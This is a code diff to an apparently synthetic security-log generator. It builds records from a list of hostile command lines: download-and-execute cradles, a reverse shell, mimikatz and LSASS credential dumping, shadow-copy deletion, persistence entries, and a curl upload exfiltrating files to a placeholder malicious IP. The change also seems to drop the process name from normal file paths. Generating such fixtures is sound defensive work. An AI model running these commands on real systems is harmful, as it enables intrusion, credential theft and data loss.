@@ -8,6 +8,9 @@ from .pools import (
 )
 from .helpers import random_timestamp, random_sha256, random_agent_version
 
+# Backslash cannot appear inside f-string braces, so we use a constant.
+_B = "\\"
+
 
 def _suspicious_cmdline() -> str:
     mal_ip = random.choice(MALICIOUS_IPS)
@@ -16,26 +19,26 @@ def _suspicious_cmdline() -> str:
         f"powershell.exe -enc {sha}",
         f"powershell.exe -nop -w hidden -ep bypass -c IEX(New-Object Net.WebClient).DownloadString('http://{mal_ip}/p.ps1')",
         "powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true",
-        f"powershell.exe -c Invoke-WebRequest -Uri http://{mal_ip}/beacon.exe -OutFile C:\Users\Public\svc.exe",
+        f"powershell.exe -c Invoke-WebRequest -Uri http://{mal_ip}/beacon.exe -OutFile C:{_B}Users{_B}Public{_B}svc.exe",
         "cmd.exe /c whoami /all && net user && net localgroup administrators",
         "cmd.exe /c net user hacker P@ssw0rd! /add && net localgroup administrators hacker /add",
         "cmd.exe /c nltest /dclist: && nltest /domain_trusts",
         "cmd.exe /c vssadmin delete shadows /all /quiet",
-        f"certutil.exe -urlcache -split -f http://{mal_ip}/payload.exe C:\Temp\svc.exe",
+        f"certutil.exe -urlcache -split -f http://{mal_ip}/payload.exe C:{_B}Temp{_B}svc.exe",
         f"mshta.exe http://{mal_ip}/evil.hta",
-        "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\"",
+        r'rundll32.exe javascript:"\..\mshtml,RunHTMLApplication"',
         f"regsvr32.exe /s /n /u /i:http://{mal_ip}/f.sct scrobj.dll",
-        f"bitsadmin /transfer j /download /priority high http://{mal_ip}/m.exe C:\Temp\m.exe",
-        "net.exe use \\\\SRV-DC01\\C$ /user:administrator P@ssw0rd",
-        "psexec.exe \\\\SRV-DC01 -u admin -p P@ss cmd.exe",
-        "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v upd /d C:\\Temp\\svc.exe",
-        "schtasks /create /tn \"SystemUpdate\" /tr C:\\Temp\\beacon.exe /sc onlogon",
-        "sc create EvilSvc binpath= \"C:\\Temp\\implant.exe\" start= auto",
-        "mimikatz.exe \"sekurlsa::logonpasswords\" exit",
-        "mimikatz.exe \"lsadump::dcsync /user:krbtgt\" exit",
-        "procdump.exe -ma lsass.exe C:\\Temp\\lsass.dmp",
-        "reg save HKLM\\SAM C:\\Temp\\sam.hiv",
-        f"curl.exe -X POST -F \"file=@C:\\Temp\\d.7z\" http://{mal_ip}/upload",
+        f"bitsadmin /transfer j /download /priority high http://{mal_ip}/m.exe C:{_B}Temp{_B}m.exe",
+        f"net.exe use {_B}{_B}SRV-DC01{_B}C$ /user:administrator P@ssw0rd",
+        f"psexec.exe {_B}{_B}SRV-DC01 -u admin -p P@ss cmd.exe",
+        f"reg add HKCU{_B}Software{_B}Microsoft{_B}Windows{_B}CurrentVersion{_B}Run /v upd /d C:{_B}Temp{_B}svc.exe",
+        f'schtasks /create /tn "SystemUpdate" /tr C:{_B}Temp{_B}beacon.exe /sc onlogon',
+        f'sc create EvilSvc binpath= "C:{_B}Temp{_B}implant.exe" start= auto',
+        'mimikatz.exe "sekurlsa::logonpasswords" exit',
+        'mimikatz.exe "lsadump::dcsync /user:krbtgt" exit',
+        f"procdump.exe -ma lsass.exe C:{_B}Temp{_B}lsass.dmp",
+        f"reg save HKLM{_B}SAM C:{_B}Temp{_B}sam.hiv",
+        f'curl.exe -X POST -F "file=@C:{_B}Temp{_B}d.7z" http://{mal_ip}/upload',
         f"bash -i >& /dev/tcp/{mal_ip}/4444 0>&1",
         f"wget http://{mal_ip}/implant -O /tmp/.h && chmod +x /tmp/.h && /tmp/.h",
         "cat /etc/shadow",
@@ -55,10 +58,13 @@ def generate(index: str, ts: str = None) -> dict:
     parents_win = ["explorer.exe", "services.exe", "cmd.exe", "powershell.exe", "svchost.exe"]
     parents_lin = ["bash", "sh", "systemd", "cron", "sshd"]
     parent = random.choice(parents_win if is_win else parents_lin)
-    file_path = (
-        random.choice(SUSPICIOUS_PATHS) if suspicious
-        else (f"C:\\Program Files\\{proc}" if is_win else f"/usr/bin/{proc}")
-    )
+
+    if suspicious:
+        file_path = random.choice(SUSPICIOUS_PATHS)
+    elif is_win:
+        file_path = "C:" + _B + "Program Files" + _B
+    else:
+        file_path = "/usr/bin/"
 
     return {
         "_index": index,
